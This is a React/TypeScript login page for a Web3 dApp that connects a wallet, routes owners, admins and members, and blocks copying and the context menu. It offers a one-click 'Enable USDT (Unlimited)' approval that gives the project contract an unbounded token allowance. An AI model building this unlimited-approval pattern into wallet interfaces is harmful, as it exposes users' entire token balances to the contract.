import React, { useEffect, useMemo, useRef, useState } from 'react'
import { useWallet } from '../context/WalletContext'
import { isRegistered, isAdmin as isAdminOnChain, getOwner, approveUSDTMax, getUSDTAllowance } from '../utils/contract'
import { useNavigate } from 'react-router-dom'
import { isValidAddress } from '../utils/wallet'
import { showErrorToast, showSuccessToast } from '../utils/notification'
import { config } from '../config'

type Phase = 'idle' | 'connecting' | 'checking' | 'enabling'

const colors = {
  accent: '#14b8a6',
  accentSoft: '#e0f5ed',
  text: '#e8f9f1',
  textMuted: 'rgba(232,249,241,0.75)',
  danger: '#ef4444',
}

const styles: Record<string, React.CSSProperties> = {
  page: {
    minHeight: '100vh',
    width: '100%',
    display: 'flex', alignItems: 'center', justifyContent: 'center',
    userSelect: 'none', padding: '24px 12px', color: colors.text,
  },
  wrap: { width: '100%', maxWidth: 880 },
  surfaceInner: { position: 'relative', zIndex: 2, textAlign: 'center' },

  badge: {
    display: 'inline-flex', alignItems: 'center', gap: 8, padding: '8px 14px', borderRadius: 999,
    fontSize: 12, fontWeight: 700, background: 'rgba(20,184,166,0.12)', color: colors.text,
    border: '1px solid rgba(20,184,166,0.25)', marginBottom: 12,
  },
  title: { fontSize: '2.0rem', fontWeight: 800, margin: '0 0 8px 0', letterSpacing: .5 },
  subtitle: { margin: '0 auto 18px', fontSize: '1rem', maxWidth: 720, color: colors.textMuted },

  cta: { marginTop: 12, display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 10 },
  button: {
    background: `linear-gradient(45deg, ${colors.accent}, ${colors.accentSoft})`,
    color: '#0b1b3b', border: 'none', outline: 'none',
    padding: '14px 22px', borderRadius: 14, fontSize: '1.05rem', fontWeight: 800, cursor: 'pointer',
    minWidth: 220, boxShadow: '0 6px 18px rgba(20,184,166,0.3)',
  },
  buttonGhost: {
    background: 'rgba(255,255,255,0.06)', color: colors.text, border: `1px solid rgba(20,184,166,0.25)`,
    padding: '12px 18px', borderRadius: 12, fontSize: '1rem', fontWeight: 800, cursor: 'pointer',
    minWidth: 220,
  },
  buttonDisabled: { opacity: 0.7, cursor: 'not-allowed' },
  hint: { fontSize: 13, color: colors.textMuted },
  error: { fontSize: 13, color: colors.danger, fontWeight: 800 },

  enabledTag: {
    display: 'inline-flex', alignItems: 'center', gap: 6,
    padding: '6px 10px', borderRadius: 999, fontSize: 12, fontWeight: 800,
    background: 'rgba(20,184,166,0.12)', border: '1px solid rgba(20,184,166,0.25)',
    color: colors.text,
  },
}

// Themed surface (global CSS classes)
const Surface: React.FC<{ children: React.ReactNode }> = ({ children }) => (
  <div className="lxr-surface">
    <div className="lxr-surface-lines" />
    <div className="lxr-surface-mesh" />
    <div className="lxr-surface-circuit" />
    <div className="lxr-surface-holo" />
    <div style={{ position: 'relative', zIndex: 2 }}>{children}</div>
  </div>
)

const Login: React.FC = () => {
  const navigate = useNavigate()
  const { connect, isConnecting, account } = useWallet()
  const [phase, setPhase] = useState<Phase>('idle')
  const [error, setError] = useState<string>('')
  const [preapproved, setPreapproved] = useState<boolean>(false)

  // Keep latest account to avoid stale closure
  const accountRef = useRef<string | null>(account)
  useEffect(() => { accountRef.current = account }, [account])

  const buttonLabel = useMemo(() => {
    if (phase === 'connecting') return 'Connecting...'
    if (phase === 'checking') return 'Checking status...'
    return isValidAddress(account) ? 'Continue' : 'Connect Wallet'
  }, [phase, account])

  // Optional: block copy/select/context menu
  useEffect(() => {
    const prevent = (e: Event) => e.preventDefault()
    document.addEventListener('copy', prevent)
    document.addEventListener('cut', prevent)
    document.addEventListener('contextmenu', prevent)
    document.addEventListener('selectstart', prevent)
    return () => {
      document.removeEventListener('copy', prevent)
      document.removeEventListener('cut', prevent)
      document.removeEventListener('contextmenu', prevent)
      document.removeEventListener('selectstart', prevent)
    }
  }, [])

  const waitForAccount = async (timeoutMs = 8000): Promise<string | null> => {
    const start = Date.now()
    while (Date.now() - start < timeoutMs) {
      const addr = accountRef.current
      if (isValidAddress(addr)) return addr!
      await new Promise((r) => setTimeout(r, 120))
    }
    return null
  }

  const refreshAllowance = async (addr: string) => {
    try {
      const allowance = await getUSDTAllowance(addr, config.contractAddress)
      setPreapproved(allowance > 0n)
    } catch {
      setPreapproved(false)
    }
  }

  useEffect(() => {
    if (isValidAddress(account)) refreshAllowance(account!)
  }, [account])

  const enableUSDTUnlimited = async () => {
    if (!isValidAddress(account)) { showErrorToast('Connect wallet first'); return }
    try {
      setPhase('enabling')
      const tx = await approveUSDTMax()
      // @ts-ignore
      await tx?.wait?.()
      await refreshAllowance(account!)
      showSuccessToast('USDT enabled (unlimited). You won’t be asked to approve again.')
    } catch (e) {
      showErrorToast(e, 'Failed to enable USDT')
    } finally {
      setPhase('idle')
    }
  }

  const checkAndRedirect = async (addr: string) => {
    setPhase('checking')
    try {
      // Admin/Owner check
      const [owner, adminFlag] = await Promise.all([getOwner(), isAdminOnChain(addr)])
      const isOwner = owner.toLowerCase() === addr.toLowerCase()
      if (adminFlag || isOwner) { navigate('/admin', { replace: true }); return }

      // Normal user flow
      const reg = await isRegistered(addr)
      if (reg) navigate('/dashboard', { replace: true })
      else navigate('/register', { replace: true })
    } catch (err: any) {
      setError(typeof err?.message === 'string' ? err.message : 'Failed to check status. Please try again.')
    } finally {
      setPhase('idle')
    }
  }

  // Auto-redirect if already connected (optional)
  useEffect(() => {
    if (!isConnecting && phase === 'idle' && isValidAddress(account)) {
      // If you want to force enabling before redirect, move checkAndRedirect after enabling.
      // checkAndRedirect(account!)
    }
  }, [account, isConnecting, phase])

  const handleConnect = async () => {
    if (phase !== 'idle' || isConnecting) return
    setError('')
    try {
      if (isValidAddress(account)) {
        await checkAndRedirect(account!)
        return
      }
      setPhase('connecting')
      await connect()
      const addr = await waitForAccount()
      if (!addr) {
        setError('Wallet address not detected. Please try again.')
        return
      }
      await refreshAllowance(addr)
      await checkAndRedirect(addr)
    } catch (err: any) {
      setError(typeof err?.message === 'string' ? err.message : 'Failed to connect. Please try again.')
    } finally {
      setPhase('idle')
    }
  }

  return (
    <div style={styles.page}>
      <div style={styles.wrap}>
        <Surface>
          <div style={styles.surfaceInner}>
            <div style={styles.badge}>Decentralized • Blockchain‑powered • Web3</div>
            <h1 className="lxr-lexori-logo" style={styles.title as any}>
              Welcome to our decentralized, blockchain‑powered Web3 community.
            </h1>
            <p style={styles.subtitle}>Connect your wallet to continue.</p>

            <div style={styles.cta}>
              <button
                onClick={handleConnect}
                disabled={phase !== 'idle' || isConnecting}
                style={{ ...styles.button, ...(phase !== 'idle' || isConnecting ? styles.buttonDisabled : {}) }}
                onMouseOver={(e) => {
                  (e.currentTarget as HTMLButtonElement).style.background =
                    `linear-gradient(45deg, ${colors.accentSoft}, ${colors.accent})`
                }}
                onMouseOut={(e) => {
                  (e.currentTarget as HTMLButtonElement).style.background =
                    `linear-gradient(45deg, ${colors.accent}, ${colors.accentSoft})`
                }}
              >
                {buttonLabel}
              </button>

              {isValidAddress(account) && (
                <>
                  {!preapproved ? (
                    <>
                      <button
                        onClick={enableUSDTUnlimited}
                        disabled={phase !== 'idle'}
                        style={{ ...styles.buttonGhost, ...(phase !== 'idle' ? styles.buttonDisabled : {}) }}
                      >
                        Enable USDT (Unlimited)
                      </button>
                      <div style={styles.hint}>
                        Approve once to skip future approvals for registration and mining purchases.
                      </div>
                    </>
                  ) : (
                    <div style={styles.enabledTag}>USDT Enabled</div>
                  )}
                </>
              )}

              {(phase === 'connecting' || phase === 'checking' || phase === 'enabling') && (
                <div style={styles.hint}>Please approve in your wallet…</div>
              )}
              {!!error && <div style={styles.error}>{error}</div>}
            </div>
          </div>
        </Surface>
      </div>
    </div>
  )
}

export default Login
